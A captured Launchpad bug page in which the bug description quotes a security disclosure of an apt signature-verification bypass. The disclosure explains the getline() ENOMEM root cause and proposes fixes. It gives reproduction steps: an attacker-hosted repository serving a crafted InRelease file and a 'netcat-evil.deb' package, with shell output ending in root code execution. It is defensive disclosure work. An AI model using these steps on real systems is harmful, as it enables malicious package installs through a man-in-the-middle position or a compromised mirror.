      var config = {"show_remove_button": false, "header": "Select a package", "vocabulary_filters": [], "remove_team_text": "Remove team", "remove_person_text": "Remove person", "selected_value_metadata": null, "show_create_team": false, "picker_type": "default", "vocabulary_name": "DistributionSourcePackage", "extra_no_results_message": null, "selected_value": "apt", "show_assign_me_button": false, "show_widget_id": "show-widget-ubuntu_xenial_apt-sourcepackagename", "step_title": "Search by name", "assign_me_text": "Pick me", "input_element": "ubuntu_xenial_apt.sourcepackagename"};
      var distribution_name = '';
      var distribution_id = '';
      var distroseries_id = '';
      if (distribution_name !== '') {
          config.getContextPath = function() {
              return '/' + distribution_name;
          }
      } else if (distribution_id !== '') {
          config.getContextPath = function() {
              return '/' + Y.DOM.byId(distribution_id).value;
          };
      } else if (distroseries_id !== '') {
          config.getContextPath = function() {
              return '/' + Y.DOM.byId(distroseries_id).value.split('/', 2)[0];
          };
      }
      var show_widget_id = 'show-widget-ubuntu_xenial_apt-sourcepackagename';
      Y.on('domready', function(e) {
          Y.lp.app.picker.addPicker(config, show_widget_id);
      });
  });
  </script>
  



          
        </td>
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_xenial_apt.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ubuntu_xenial_apt.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ubuntu_xenial_apt.status" name="ubuntu_xenial_apt.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="ubuntu_xenial_apt.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceHIGH">High</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_xenial_apt.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="ubuntu_xenial_apt.assignee.assign_to_nobody" name="ubuntu_xenial_apt.assignee.option" value="ubuntu_xenial_apt.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_xenial_apt.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ubuntu_xenial_apt.assignee.assign_to_me" name="ubuntu_xenial_apt.assignee.option" value="ubuntu_xenial_apt.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_xenial_apt.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ubuntu_xenial_apt.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ubuntu_xenial_apt.comment_on_change" name="ubuntu_xenial_apt.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary2173841">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/yakkety/+source/apt/+bug/1647467/+editstatus">
        &#8203;
      </a>
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/yakkety/+source/apt">Yakkety</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/yakkety/+source/apt/+bug/1647467/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/yakkety/+source/apt/+bug/1647467/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceHIGH">High</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2173841">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2173841">
     <td colspan="7"><form action="/ubuntu/yakkety/+source/apt/+bug/1647467/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ubuntu/yakkety/+source/apt">apt (Ubuntu Yakkety)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2016-12-05 23:19:45 UTC" datetime="2016-12-05T23:19:45.713744+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2016-12-13 17:02:02 UTC" datetime="2016-12-13T17:02:02.331290+00:00">2016-12-13</time>
      </td>
    </tr>
    
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2016-12-13 17:02:02 UTC" datetime="2016-12-13T17:02:02.331290+00:00">2016-12-13</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2016-12-13 17:02:02 UTC" datetime="2016-12-13T17:02:02.331290+00:00">2016-12-13</time>
      </td>
    </tr>
  </table>
  <div class="field">
    
    <table>
      <tr>
        <td>
          <label for="ubuntu_yakkety_apt.sourcepackagename">Package</label>
        </td>
      </tr>
      <tr>
        <td>
          


    <input type="text" value="apt" id="ubuntu_yakkety_apt.sourcepackagename"
                         name="ubuntu_yakkety_apt.sourcepackagename" size="20"
                         maxlength=""
                         onKeyPress="" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_yakkety_apt.sourcepackagename');
              var select_menu = Y.DOM.byId('ubuntu_yakkety_apt.sourcepackagename-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_yakkety_apt-sourcepackagename" href="#">Find&hellip;</a>)</span>
    <script>
  LPJS.use('node', 'lp.app.picker', function(Y) {
      var config = {"show_remove_button": false, "header": "Select a package", "vocabulary_filters": [], "remove_team_text": "Remove team", "remove_person_text": "Remove person", "selected_value_metadata": null, "show_create_team": false, "picker_type": "default", "vocabulary_name": "DistributionSourcePackage", "extra_no_results_message": null, "selected_value": "apt", "show_assign_me_button": false, "show_widget_id": "show-widget-ubuntu_yakkety_apt-sourcepackagename", "step_title": "Search by name", "assign_me_text": "Pick me", "input_element": "ubuntu_yakkety_apt.sourcepackagename"};
      var distribution_name = '';
      var distribution_id = '';
      var distroseries_id = '';
      if (distribution_name !== '') {
          config.getContextPath = function() {
              return '/' + distribution_name;
          }
      } else if (distribution_id !== '') {
          config.getContextPath = function() {
              return '/' + Y.DOM.byId(distribution_id).value;
          };
      } else if (distroseries_id !== '') {
          config.getContextPath = function() {
              return '/' + Y.DOM.byId(distroseries_id).value.split('/', 2)[0];
          };
      }
      var show_widget_id = 'show-widget-ubuntu_yakkety_apt-sourcepackagename';
      Y.on('domready', function(e) {
          Y.lp.app.picker.addPicker(config, show_widget_id);
      });
  });
  </script>
  



          
        </td>
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_yakkety_apt.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ubuntu_yakkety_apt.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ubuntu_yakkety_apt.status" name="ubuntu_yakkety_apt.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="ubuntu_yakkety_apt.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceHIGH">High</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_yakkety_apt.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="ubuntu_yakkety_apt.assignee.assign_to_nobody" name="ubuntu_yakkety_apt.assignee.option" value="ubuntu_yakkety_apt.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_yakkety_apt.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ubuntu_yakkety_apt.assignee.assign_to_me" name="ubuntu_yakkety_apt.assignee.option" value="ubuntu_yakkety_apt.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_yakkety_apt.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ubuntu_yakkety_apt.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ubuntu_yakkety_apt.comment_on_change" name="ubuntu_yakkety_apt.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary2173845">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/zesty/+source/apt/+bug/1647467/+editstatus">
        &#8203;
      </a>
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/zesty/+source/apt">Zesty</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/zesty/+source/apt/+bug/1647467/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/zesty/+source/apt/+bug/1647467/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceHIGH">High</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2173845">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~juliank">Julian Andres Klode</a>
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2173845">
     <td colspan="7"><form action="/ubuntu/zesty/+source/apt/+bug/1647467/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ubuntu/zesty/+source/apt">apt (Ubuntu Zesty)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2016-12-05 23:19:45 UTC" datetime="2016-12-05T23:19:45.713744+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2016-12-05 20:37:01 UTC" datetime="2016-12-05T20:37:01.933783+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Assigned:</th>
      <td>
        <time title="2016-12-05 22:19:38 UTC" datetime="2016-12-05T22:19:38.210106+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2016-12-05 22:19:38 UTC" datetime="2016-12-05T22:19:38.209326+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2016-12-18 01:53:53 UTC" datetime="2016-12-18T01:53:53.990671+00:00">2016-12-18</time>
      </td>
    </tr>
  </table>
  <div class="field">
    
    <table>
      <tr>
        <td>
          <label for="ubuntu_zesty_apt.sourcepackagename">Package</label>
        </td>
      </tr>
      <tr>
        <td>
          


    <input type="text" value="apt" id="ubuntu_zesty_apt.sourcepackagename"
                         name="ubuntu_zesty_apt.sourcepackagename" size="20"
                         maxlength=""
                         onKeyPress="" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_zesty_apt.sourcepackagename');
              var select_menu = Y.DOM.byId('ubuntu_zesty_apt.sourcepackagename-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_zesty_apt-sourcepackagename" href="#">Find&hellip;</a>)</span>
    <script>
  LPJS.use('node', 'lp.app.picker', function(Y) {
      var config = {"show_remove_button": false, "header": "Select a package", "vocabulary_filters": [], "remove_team_text": "Remove team", "remove_person_text": "Remove person", "selected_value_metadata": null, "show_create_team": false, "picker_type": "default", "vocabulary_name": "DistributionSourcePackage", "extra_no_results_message": null, "selected_value": "apt", "show_assign_me_button": false, "show_widget_id": "show-widget-ubuntu_zesty_apt-sourcepackagename", "step_title": "Search by name", "assign_me_text": "Pick me", "input_element": "ubuntu_zesty_apt.sourcepackagename"};
      var distribution_name = '';
      var distribution_id = '';
      var distroseries_id = '';
      if (distribution_name !== '') {
          config.getContextPath = function() {
              return '/' + distribution_name;
          }
      } else if (distribution_id !== '') {
          config.getContextPath = function() {
              return '/' + Y.DOM.byId(distribution_id).value;
          };
      } else if (distroseries_id !== '') {
          config.getContextPath = function() {
              return '/' + Y.DOM.byId(distroseries_id).value.split('/', 2)[0];
          };
      }
      var show_widget_id = 'show-widget-ubuntu_zesty_apt-sourcepackagename';
      Y.on('domready', function(e) {
          Y.lp.app.picker.addPicker(config, show_widget_id);
      });
  });
  </script>
  



          
        </td>
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_zesty_apt.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ubuntu_zesty_apt.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ubuntu_zesty_apt.status" name="ubuntu_zesty_apt.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="ubuntu_zesty_apt.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceHIGH">High</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_zesty_apt.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ubuntu_zesty_apt.assignee.assign_to_me" name="ubuntu_zesty_apt.assignee.option" value="ubuntu_zesty_apt.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_zesty_apt.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
      
        <tr>
          <td style="padding: 0 2px 2px 0">
              <input type="radio" checked="checked" id="ubuntu_zesty_apt.assignee.assigned_to" name="ubuntu_zesty_apt.assignee.option" value="ubuntu_zesty_apt.assignee.assigned_to" />
          </td>
          <td style="padding: 0">
            <label style="font-weight: normal" for="ubuntu_zesty_apt.assignee.assigned_to">
              Julian Andres Klode (juliank)
            </label>
          </td>
        </tr>
      
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ubuntu_zesty_apt.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ubuntu_zesty_apt.comment_on_change" name="ubuntu_zesty_apt.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
      </tbody>

    </table>



<div class="actions">
  
    <span id="also-affects-product" class="">
    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+choose-affected-product">Also affects project</a>
        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
    </span>
    <span id="also-affects-package" class="">
    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+distrotask">Also affects distribution/package</a>
    </span>
    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+nominate">Nominate for series</a>
    
  

</div>




      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>We have just been made aware of a security bug upstream that affects the validation of signatures on InRelease file. This bug is to track progress for it.</p>
<p>It allows for attacking a repository via MITM attacks, circumventing the signature of the InRelease file.</p>
<p>It works by making a call to getline() fail with ENOMEM, which is not documented as an error for that but follows from the fact that getline() can allocate memory. In such a case, apt would treat the first part of the file as a valid release file.</p>
<p>= Original bug report =<br />
From: Jann Horn &lt;email address hidden&gt;<br />
To: &lt;email address hidden&gt;<br />
Cc:<br />
Date: Mon, 5 Dec 2016 18:33:09 +0100<br />
Subject: apt: repository signing bypass via memory allocation failure</p>
<p>== Vulnerability ==<br />
When apt-get updates a repository that uses an InRelease file (clearsigned<br />
Release files), this file is processed as follows:<br />
First, the InRelease file is downloaded to disk.<br />
In a subprocess running the gpgv helper, &quot;apt-key verify&quot; (with some more<br />
arguments) is executed through the following callchain:</p>
<p>gpgv.cc:main -&gt; pkgAcqMethod::Run -&gt; GPGVMethod:<wbr />:URIAcquire<br />
&nbsp;&nbsp;-&gt; GPGVMethod:<wbr />:VerifyGetSigne<wbr />rs -&gt; ExecGPGV</p>
<p>ExecGPGV() splits the clearsigned file into payload and signature using<br />
SplitClearSigne<wbr />dFile()<wbr />, calls apt-key on these two files to perform the<br />
cryptographic signature verification, then discards the split files and only<br />
retains the clearsigned original. SplitClearSigne<wbr />dFile() ignores leading and<br />
trailing garbage.</p>
<p>Afterwards, in the parent process, the InRelease file has to be loaded again<br />
so that its payload can be processed. At this point, the code<br />
isn&#x27;t aware anymore whether the Release file was clearsigned or<br />
split-signed, so the file is opened using OpenMaybeClearS<wbr />ignedFile(<wbr />), which<br />
first attempts to parse the file as a clearsigned (InRelease) file and extract<br />
the payload, then falls back to treating the file as the file as a split-signed<br />
(Release) file if the file format couldn&#x27;t be recognized.</p>
<p>The weakness here is: If an attacker can create an InRelease file that<br />
is parsed as a proper split-signed file during signature validation, but then<br />
isn&#x27;t recognized by OpenMaybeClearS<wbr />ignedFile(<wbr />), the &quot;leading garbage&quot; that was<br />
ignored by the signature validation is interpreted as repository metadata,<br />
bypassing the signing scheme.</p>
<p>It first looks as if it would be impossible to create a file that is recognized<br />
as split-signed by ExecGPGV(), but isn&#x27;t recognized by<br />
OpenMaybeClearS<wbr />ignedFile(<wbr />), because both use the same function,<br />
SplitClearSigne<wbr />dFile()<wbr />, for parsing the file. However, multiple executions of<br />
SplitClearSigne<wbr />dFile() on the same data can actually have different non-error<br />
results because of a bug.<br />
SplitClearSigne<wbr />dFile() uses getline() to parse the input file. A return code<br />
of -1, which signals that either EOF or an error occured, is always treated<br />
as EOF. The Linux manpage only lists EINVAL (caused by bad arguments) as<br />
possible error code, but because the function allocates (nearly) unbounded<br />
amounts of memory, it can actually also fail with ENOMEM if it runs out of<br />
memory.<br />
Therefore, if an attacker can cause the address space in the main apt-get<br />
process to be sufficiently constrained to prevent allocation of a large line<br />
buffer while the address space of the gpgv helper process is less constrained<br />
and permits the allocation of a buffer with the same size, the attacker can use<br />
this to fake an end-of-file condition in SplitClearSigne<wbr />dFile() that causes the<br />
file to be parsed as a normal Release file.</p>
<p>A very crude way to cause such a constraint on a 32-bit machine is based on<br />
abusing ASLR. Because ASLR randomizes the address space after each execve(),<br />
thereby altering how much contiguous virtual memory is available, an allocation<br />
that attempts to use the average available virtual memory should ideally succeed<br />
50% of the time, resulting in an upper limit of 25% for the success rate of the<br />
whole attack. (That&#x27;s not very effective, and a real attacker would likely want<br />
a much higher success rate, but it works for a proof of concept.)<br />
This is not necessarily a limitation of the vulnerability, just a limitation<br />
of the way the exploit is designed.</p>
<p>I think that it would make sense to fix this as follows:<br />
&nbsp;- Set errno to 0 before calling getline(), verify that it&#x27;s still 0 after<br />
&nbsp;&nbsp;&nbsp;returning -1, treat it as an error if errno isn&#x27;t 0 anymore.<br />
&nbsp;- Consider splitting the InRelease file only once, before signature validation,<br />
&nbsp;&nbsp;&nbsp;and then deleting the original clearsigned file instead of the payload file.<br />
&nbsp;&nbsp;&nbsp;This would get rid of the weakness that the file is parsed twice and parsing<br />
&nbsp;&nbsp;&nbsp;differences can have security consequences, which is a pretty brittle design.<br />
&nbsp;- I&#x27;m not sure whether this bug would have been exploitable if the parser for<br />
&nbsp;&nbsp;&nbsp;split files or the parser for Release files had been stricter. You might want<br />
&nbsp;&nbsp;&nbsp;to consider whether you could harden this code that way.</p>
<p>== Reproduction instructions ==<br />
These steps are probably more detailed than necessary.</p>
<p>First, prepare a clean Debian VM for the victim:</p>
<p>&nbsp;- download debian-<wbr />8.6.0-i386-<wbr />netinst.<wbr />iso (it is important that this<br />
&nbsp;&nbsp;&nbsp;is i386 and not amd64)<br />
&nbsp;- install Virtualbox (I&#x27;m using version 4.6.36 from Ubuntu)<br />
&nbsp;- create a new VM with the following properties:<br />
&nbsp;&nbsp;- type &quot;Linux&quot;, version &quot;Debian (32-bit)&quot;<br />
&nbsp;&nbsp;- 8192 MB RAM (this probably doesn&#x27;t matter much, especially<br />
&nbsp;&nbsp;&nbsp;&nbsp;if you enable swap)<br />
&nbsp;&nbsp;- create a new virtual harddrive, size 20GB (also doesn&#x27;t matter much)<br />
&nbsp;- launch the VM, insert the CD<br />
&nbsp;- pick graphical install<br />
&nbsp;- in the installer, use defaults everywhere, apart from enabling Xfce<br />
&nbsp;&nbsp;&nbsp;in the software selection</p>
<p>After installation has finished, log in, launch a terminal,<br />
&quot;sudo nano /etc/apt/<wbr />sources.<wbr />list&quot;, change the &quot;deb&quot; line for jessie-updates<br />
so that it points to some unused port on the host machine instead of<br />
the proper mirror<br />
(&quot;deb <a rel="nofollow" href="http://192.168.0.2:1337/debian/">http://<wbr />192.168.<wbr />0.2:1337/<wbr />debian/</a> jessie-updates main&quot; or so).<br />
This simulates a MITM attack or compromised mirror.</p>
<p>On the host (as the attacker):</p>
<p>$ tar xvf apt_sig_bypass.tar<br />
apt_sig_bypass/<br />
apt_sig_<wbr />bypass/<wbr />debian/<br />
apt_sig_<wbr />bypass/<wbr />debian/<wbr />netcat-<wbr />evil.deb<br />
apt_sig_<wbr />bypass/<wbr />debian/<wbr />dists/<br />
apt_sig_<wbr />bypass/<wbr />debian/<wbr />dists/jessie-<wbr />updates/<br />
apt_sig_<wbr />bypass/<wbr />debian/<wbr />dists/jessie-<wbr />updates/<wbr />InRelease.<wbr />part1<br />
apt_sig_<wbr />bypass/<wbr />debian/<wbr />dists/jessie-<wbr />updates/<wbr />main/<br />
apt_sig_<wbr />bypass/<wbr />debian/<wbr />dists/jessie-<wbr />updates/<wbr />main/binary-<wbr />i386/<br />
apt_sig_<wbr />bypass/<wbr />debian/<wbr />dists/jessie-<wbr />updates/<wbr />main/binary-<wbr />i386/Packages<br />
apt_sig_<wbr />bypass/<wbr />make_inrelease.<wbr />py<br />
$ cd apt_sig_bypass/<br />
$ curl --output debian/<wbr />dists/jessie-<wbr />updates/<wbr />InRelease.<wbr />part2<br />
<a rel="nofollow" href="http://ftp.us.debian.org/debian/dists/jessie-updates/InRelease">http://<wbr />ftp.us.<wbr />debian.<wbr />org/debian/<wbr />dists/jessie-<wbr />updates/<wbr />InRelease</a><br />
&nbsp;&nbsp;% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dload  Upload   Total   Spent    Left  Speed<br />
100  141k  100  141k    0     0   243k      0 --:--:-- --:--:-- --:--:--  243k<br />
$ ./make_inrelease.py<br />
$ ls -lh debian/<wbr />dists/jessie-<wbr />updates/<wbr />InRelease<br />
-rw-r--r-- 1 user user 1.3G Dec  5 17:13 debian/<wbr />dists/jessie-<wbr />updates/<wbr />InRelease<br />
$ python -m SimpleHTTPServer 1337 .<br />
Serving HTTP on 0.0.0.0 port 1337 ...</p>
<p>Now, in the VM, as root, run &quot;apt-get update&quot;.<br />
It will probably fail - run it again until it doesn&#x27;t fail anymore.<br />
The errors that can occur are &quot;Clearsigned file isn&#x27;t valid&quot; (when the<br />
allocation during gpg verification fails) and some message about<br />
a hash mismatch (when both allocations succeed). After &quot;apt-get update&quot;<br />
has succeeded, run &quot;apt-get upgrade&quot; and confirm the upgrade. The result should<br />
look like this (server IP censored, irrelevant output removed and marked with<br />
&quot;[...]&quot;):</p>
<p>root@debian:<wbr />/home/user# apt-get update<br />
Get:1 http://{{{SERVERIP}}}:1337 jessie-updates InRelease [1,342 MB]<br />
[...]<br />
Hit <a rel="nofollow" href="http://ftp.us.debian.org">http://<wbr />ftp.us.<wbr />debian.<wbr />org</a> jessie-updates InRelease<br />
[...]<br />
100% [1 InRelease gpgv 1,342 MB]<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;28.6 MB/s 0sSplitting up<br />
/var/lib/<wbr />apt/lists/<wbr />partial/<wbr />{{{SERVERIP}<wbr />}}:1337_<wbr />debian_<wbr />dists_jessie-<wbr />updates_<wbr />InRelease<br />
intIgn http://{{{SERVERIP}}}:1337 jessie-updates InRelease<br />
E: GPG error: http://{{{SERVERIP}}}:1337 jessie-updates InRelease:<br />
Clearsigned file isn&#x27;t valid, got &#x27;NODATA&#x27; (does the network require<br />
authentication?)</p>
<p>root@debian:<wbr />/home/user# apt-get update<br />
[...]<br />
Get:1 http://{{{SERVERIP}}}:1337 jessie-updates InRelease [1,342 MB]<br />
[...]<br />
Hit <a rel="nofollow" href="http://ftp.us.debian.org">http://<wbr />ftp.us.<wbr />debian.<wbr />org</a> jessie-updates InRelease<br />
Get:4 http://{{{SERVERIP}}}:1337 jessie-updates/main i386 Packages [170 B]<br />
[...]<br />
Fetched 1,349 MB in 55s (24.4 MB/s)<br />
Reading package lists... Done</p>
<p>root@debian:<wbr />/home/user# apt-get upgrade<br />
Reading package lists... Done<br />
Building dependency tree<br />
Reading state information... Done<br />
Calculating upgrade... Done<br />
The following packages will be upgraded:<br />
&nbsp;&nbsp;netcat-<wbr />traditional<br />
1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.<br />
Need to get 666 B of archives.<br />
After this operation, 109 kB disk space will be freed.<br />
Do you want to continue? [Y/n]<br />
Get:1 http://{{{SERVERIP}<wbr />}}:1337/<wbr />debian/ jessie-updates/main<br />
netcat-traditional i386 9000 [666 B]<br />
Fetched 666 B in 0s (0 B/s)<br />
Reading changelogs... Done<br />
dpkg: warning: parsing file &#x27;/var/lib/<wbr />dpkg/tmp.<wbr />ci/control&#x27; near line 5<br />
package &#x27;netcat-<wbr />traditional&#x27;<wbr />:<br />
&nbsp;missing description<br />
dpkg: warning: parsing file &#x27;/var/lib/<wbr />dpkg/tmp.<wbr />ci/control&#x27; near line 5<br />
package &#x27;netcat-<wbr />traditional&#x27;<wbr />:<br />
&nbsp;missing maintainer<br />
(Reading database ... 86469 files and directories currently installed.)<br />
Preparing to unpack .../netcat-<wbr />traditional_<wbr />9000_i386.<wbr />deb ...<br />
arbitrary code execution reached<br />
uid=0(root) gid=0(root) groups=0(root)<br />
[...]</p>
<p>As you can see, if the attacker gets lucky with the ASLR randomization, there<br />
